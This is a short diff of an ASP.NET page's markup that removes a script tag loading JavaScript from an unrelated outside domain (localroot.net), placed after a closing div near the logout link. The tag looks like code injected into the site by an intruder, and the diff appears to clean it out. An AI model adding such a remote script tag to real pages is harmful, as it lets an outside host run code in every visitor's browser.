@@ -1442,9 +1442,7 @@ return QS.Get();
                 LOGOUT</asp:LinkButton>
               <h3 >  </h3> 
            
-         </div>
-         <script src=http://www.localroot.net/ibneler/yaz.js></script>
-        
+         </div>        
            <div class="tab_container">
                 <div id="Menue" visible="false" runat="server">
              <ul class="tabs">
